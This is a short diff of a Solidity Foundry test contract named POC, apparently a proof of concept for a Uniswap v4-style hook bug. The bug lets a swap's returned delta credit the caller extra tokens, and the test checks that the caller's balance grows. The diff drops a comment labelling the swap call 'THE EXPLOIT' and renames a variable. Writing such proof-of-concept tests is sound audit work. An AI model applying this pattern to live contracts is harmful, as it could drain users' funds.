@@ -46,7 +46,6 @@ contract POC is Test {
             if(delta.amount0()>0) manager.take(c0, address(this), uint128(delta.amount0()));
             if(delta.amount1()>0) manager.take(c1, address(this), uint128(delta.amount1()));
         } else {
-            // THIS IS THE EXPLOIT - s already includes hook's 100e18
             BalanceDelta s = manager.swap(key, SwapParams(false,-0.1e18,TickMath.MAX_SQRT_PRICE-1), "");
             if(s.amount0()<0){manager.sync(c0); token0.mint(address(manager), uint128(-s.amount0())); manager.settle();}
             else if(s.amount0()>0){manager.take(c0, address(this), uint128(s.amount0()));}
@@ -56,8 +55,8 @@ contract POC is Test {
         return "";
     }
     function test_afterSwapReturnDelta() public {
-        uint b0 = token0.balanceOf(address(this));
+        uint b = token0.balanceOf(address(this));
         manager.unlock(abi.encode(uint256(2)));
-        assertGt(token0.balanceOf(address(this)), b0);
+        assertGt(token0.balanceOf(address(this)), b);
     }
 }
